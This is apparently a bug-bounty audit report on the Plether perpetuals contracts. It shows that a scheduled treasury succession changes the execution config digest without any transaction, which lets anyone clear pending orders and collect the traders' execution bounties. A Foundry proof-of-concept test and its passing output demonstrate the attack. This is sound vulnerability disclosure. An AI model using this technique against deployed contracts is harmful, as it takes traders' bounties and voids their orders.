# \#99552 [SC-Low] Scheduled treasury succession changes the execution config digest at a timestamp with no transaction, terminally invalidating pending orders and paying their bounties to whoever clears them

**Submitted on Nov 14th 2026 at 06:41:47 UTC by @Valisthea for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99552
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

The execution config digest that every public order pins at commit includes the protocol treasury, and the treasury is resolved from `block.timestamp`. When a scheduled treasury successor activates at the end of the current lock, the digest changes at that instant with no transaction and no event. Every config-pinned order still pending in that second becomes `ConfigMismatch`; anyone can clear it with `clearInvalidOrders` and is credited the trader's execution bounty without executing anything, and the trader's order is terminally lost.

The protocol promises the opposite. `SECURITY.md` describes the digest as moving only with finalized configuration (`packages/perps/SECURITY.md:105-107`): "Each successful Engine/Router finalization therefore changes `OrderLifecycleBook.currentExecutionConfigHash()`. Proposal, cancellation, pause/unpause, and failed finalization do not advance these versions." A pinned order is therefore expected to stay valid until a finalized configuration change, which is a transaction traders, keepers and integrators can observe. The scheduled succession breaks that promise at a moment no transaction marks.

## Details

- `OrderLifecycleBook.currentExecutionConfigHash()` folds `engine.protocolTreasury()` into the digest (`packages/perps/src/OrderLifecycleBook.sol:199`).
- `CfdTreasury.protocolTreasury()` returns `_activeTreasury().account` (`packages/perps/src/CfdTreasury.sol:45-47`). `_activeTreasury()` is a `view` that returns the pending successor as soon as `block.timestamp >= _currentTreasury.lockedUntil` (`CfdTreasury.sol:101-106`). The contract's own NatSpec states that "Scheduled activation is resolved by timestamp and emits no automatic event" and "no transaction or event is required at activationTime" (`CfdTreasury.sol:23`, `:33`).
- External orders must pin the current nonzero digest (`SECURITY.md:760-761`). A mismatch is terminal (`OrderRouterExecutionSidecar.sol:403-406, 915`; `OrderRecoverySidecar.sol:90-93`), and `clearInvalidOrders` lets any caller clear such orders anywhere in the queue, paying the caller as executor.

The treasury succession itself is a legitimate, documented owner workflow (lock the current treasury, then schedule a successor; the program lists "set the treasury" among the owner's documented actions). The bug is in how the order system consumes it: an identity digest that gates order validity reads a timestamp-resolved value, so a legitimate owner action terminally invalidates other users' orders at an unmarked instant.

## Impact

At the activation second:

1. Every pending public order committed in the preceding execution window (default 60 s) becomes `ConfigMismatch`, including voluntary closes.
2. Any third party can call `clearInvalidOrders` on those ids and is credited each open order's execution bounty, without supplying an oracle update or executing anything.
3. The traders' orders are terminally lost and must be resubmitted at the back of the queue.

The contract fails to deliver the promised execution of a validly pinned order, and the trader additionally loses the reserved execution bounty to an uninvolved account (0.20 USDG per order at release parameters, measured in the PoC). The affected cohort is one execution window per scheduled activation.

## Recommendation

Avoid timestamp-resolved values in an identity digest that gates order validity:

- Hash the persisted `_currentTreasury.account` instead of the timestamp-resolved view, and require an explicit, event-emitting activation transaction (for example a permissionless `activateProtocolTreasury()` that calls `_syncTreasury()`), so the digest changes only in a transaction.
- Or exclude the treasury from `currentExecutionConfigHash()`: it does not change the execution economics an order pins (fees are routed to whichever treasury is current at settlement).
- At minimum, refund the bounty to the trader (rather than the cleaner) when an order is cleared for a configuration change the trader could not observe, and document the timestamp-driven digest change in `SECURITY.md` (around lines 105-107 and 767-775).

## Proof of Concept

## Proof of concept

Self-contained Foundry test at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It inherits only the repository's `BasePerpTest`, uses the release risk parameters, and mocks only out-of-scope components (Pyth price updates and USDG).

### Steps

1. The owner locks the current treasury for one day (`setProtocolTreasury(TREASURY_A, 1 days)`) and schedules a successor (`proposeProtocolTreasury(TREASURY_B, 0)`).
2. Thirty seconds before the lock expires, ALICE commits an open; it pins the current digest and reserves a 0.20 USDG execution bounty.
3. Time reaches the lock expiry. No transaction is sent. `protocolTreasury()` now returns `TREASURY_B` and `currentExecutionConfigHash()` differs from the pinned digest.
4. An uninvolved account calls `clearInvalidOrders([id])`. The order is cleared as `ConfigMismatch`, ALICE has no position, and the cleaner is credited exactly ALICE's 0.20 USDG bounty.
5. Control: the same timeline without a scheduled successor keeps the digest stable, and the order is not clearable.

Save as `packages/perps/test/perps/accounting/close/TreasuryDigestFlipPoC.t.sol` and run:

```bash
forge test --root packages/perps --match-path 'test/perps/accounting/close/TreasuryDigestFlipPoC.t.sol' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

interface IRouterBook {
    function lifecycleBook() external view returns (address);
    function clearInvalidOrders(uint64[] calldata orderIds) external returns (uint256 nextIndex, uint256 cleared);
}

contract TreasuryDigestFlipPoC is BasePerpTest {

    uint256 internal constant LOT_ = 1e20;
    address internal constant KEEPER0 = address(0xCAFE);
    address internal constant ALICE = address(0xA11CE);
    address internal constant BOB = address(0xB0B);
    address internal constant TREASURY_A = address(0x7EA5A);
    address internal constant TREASURY_B = address(0x7EA5B);
    address internal constant CLEANER = address(0xC1EA);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    function setUp() public override {
        super.setUp();
        vm.deal(KEEPER0, 100 ether);
        _fundTrader(ALICE, 50_000e6);
        _fundTrader(BOB, 300_000e6);
        vm.warp(vm.getBlockTimestamp() + 1 days + 3 hours);
        _refresh(1e8);
        require(!engine.isFadWindow() && !engine.isOracleFrozen(), "setup must start in a live session");
    }

    function _pythAt(uint256 price, uint256 publishTime) internal returns (bytes[] memory updateData) {
        bytes32[] memory feedIds = new bytes32[](2);
        feedIds[0] = bytes32(uint256(1));
        feedIds[1] = bytes32(uint256(2));
        baseMockPyth.setAllUniquePrices(feedIds, int64(int256(price)), 0, int32(-8), publishTime, publishTime - 1);
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _refresh(uint256 price) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _pythAt(price, vm.getBlockTimestamp());
        vm.prank(KEEPER0);
        router.updateMarkPrice(data);
    }

    function _commit(address account, CfdTypes.Side side, uint256 lots, uint256 margin, bool isClose)
        internal
        returns (uint64 orderId)
    {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        orderId = router.nextCommitId();
        vm.prank(account);
        router.commitOrder(side, lots * LOT_, margin, 0, isClose);
    }

    function _fillHead(uint256 price) internal returns (uint64 head) {
        head = router.nextExecuteId();
        require(head != 0, "no head");
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(head);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
        bytes[] memory data = _pythAt(price, uint256(pending.commitTime) + 1);
        vm.prank(KEEPER0);
        router.executeOrder(head, data);
    }

    function _size(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _book() internal view returns (IOrderLifecycleBook) {
        return IOrderLifecycleBook(IRouterBook(address(router)).lifecycleBook());
    }

    /// Owner rotates the treasury exactly as the API intends: lock the current one, schedule a successor.
    function _scheduleRotation() internal returns (uint256 activation) {
        engine.setProtocolTreasury(TREASURY_A, 1 days);
        engine.proposeProtocolTreasury(TREASURY_B, 0);
        (, activation,) = engine.pendingProtocolTreasury();
        require(activation == vm.getBlockTimestamp() + 1 days, "activation at lock expiry");
    }

    function _commitOpenBefore(uint256 activation) internal returns (uint64 id, uint256 bounty, bytes32 pinned) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(activation - 30);
        _refresh(1e8);
        id = _commit(ALICE, CfdTypes.Side.LONG, 1000, 5000e6, false);
        OrderV3Types.PendingIntent memory intent = _book().pendingIntent(id);
        bounty = intent.executionBountyAssets;
        pinned = intent.bounds.expectedConfigHash;
        require(bounty > 0, "open carries a bounty");
        require(pinned != bytes32(0), "public order pins the digest");
    }

    function test_X18a_ScheduledTreasurySuccessionFlipsDigestWithNoTransaction() public {
        _commit(BOB, CfdTypes.Side.SHORT, 2000, 20_000e6, false);
        _fillHead(1e8);
        uint256 activation = _scheduleRotation();
        (uint64 id, uint256 bounty, bytes32 pinned) = _commitOpenBefore(activation);
        assertEq(_book().currentExecutionConfigHash(), pinned, "digest matches at commit");

        // No transaction of any kind: only time passes to the lock expiry.
        vm.warp(activation);
        assertEq(engine.protocolTreasury(), TREASURY_B, "successor active by timestamp alone");
        assertTrue(_book().currentExecutionConfigHash() != pinned, "digest changed with no transaction");

        // A third party that executes nothing clears the order and is paid the trader's bounty.
        uint256 cleanerBefore = clearinghouse.balanceAssets(CLEANER);
        uint64[] memory ids = new uint64[](1);
        ids[0] = id;
        vm.prank(CLEANER);
        (, uint256 cleared) = IRouterBook(address(router)).clearInvalidOrders(ids);
        assertEq(cleared, 1, "order cleared as ConfigMismatch");
        (IOrderRouterAccounting.PendingOrderView memory p,) = router.getPendingOrderView(id);
        assertEq(p.commitTime, 0, "order terminal");
        assertEq(_size(ALICE), 0, "trader's open never executed");
        uint256 paid = clearinghouse.balanceAssets(CLEANER) - cleanerBefore;
        emit log_named_uint("trader bounty", bounty);
        emit log_named_uint("paid to cleaner", paid);
        assertEq(paid, bounty, "cleaner collected the trader's execution bounty");
    }

    /// Control: same timeline without a scheduled successor. The digest is stable and the order is not clearable.
    function test_X18b_Control_NoSuccessorDigestStableOrderExecutes() public {
        _commit(BOB, CfdTypes.Side.SHORT, 2000, 20_000e6, false);
        _fillHead(1e8);
        engine.setProtocolTreasury(TREASURY_A, 1 days);
        uint256 activation = vm.getBlockTimestamp() + 1 days;
        (uint64 id,, bytes32 pinned) = _commitOpenBefore(activation);
        vm.warp(activation);
        assertEq(_book().currentExecutionConfigHash(), pinned, "digest stable without succession");
        uint64[] memory ids = new uint64[](1);
        ids[0] = id;
        vm.prank(CLEANER);
        (, uint256 cleared) = IRouterBook(address(router)).clearInvalidOrders(ids);
        assertEq(cleared, 0, "valid order is not clearable");
    }

}
```

### Output (run locally at a82d4fef)

```
[PASS] test_X18a_ScheduledTreasurySuccessionFlipsDigestWithNoTransaction() (gas: 3901074)
Logs:
  trader bounty: 200000
  paid to cleaner: 200000
[PASS] test_X18b_Control_NoSuccessorDigestStableOrderExecutes() (gas: 3886645)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```
